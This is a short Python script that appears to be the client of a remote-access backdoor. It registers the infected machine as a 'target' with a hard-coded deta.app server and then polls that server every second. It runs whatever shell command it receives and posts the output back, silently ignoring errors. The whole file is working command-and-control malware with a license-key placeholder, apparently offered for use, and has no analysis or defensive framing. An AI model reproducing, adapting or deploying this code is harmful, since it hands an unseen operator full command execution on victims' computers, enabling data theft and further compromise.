from subprocess import getoutput
from requests import get, exceptions, post
from time import sleep
from platform import uname
from hashlib import md5
API = 'https://codesetter-1-o6783419.deta.app/'
LICENSE = 'YOUR_LICENSE'

client_id = uname()[1]+'-'+md5(''.join(uname()).encode()).hexdigest()
def check_connection():
    try:
        get('https://google.com')
        return True
    except exceptions.ConnectionError:
        while not sleep(1):
            try:
                get('https://google.com')
                return True
            except exceptions.ConnectionError:
                pass
if check_connection():
    if not get(API+'newtarget', params={'uuid': client_id,'license': LICENSE}).json()['ok']:
        get(API+'online', params={'key': LICENSE, 'uuid': client_id})
while not sleep(1):
    try:
        if check_connection():
            code = get(API, params={'key': LICENSE, 'uuid': client_id}).json()
            if code['ok']:
                post(API+'result', json={'result': getoutput(code['code'])}, params={'uuid': client_id, 'key': LICENSE})
    except Exception as e:
        pass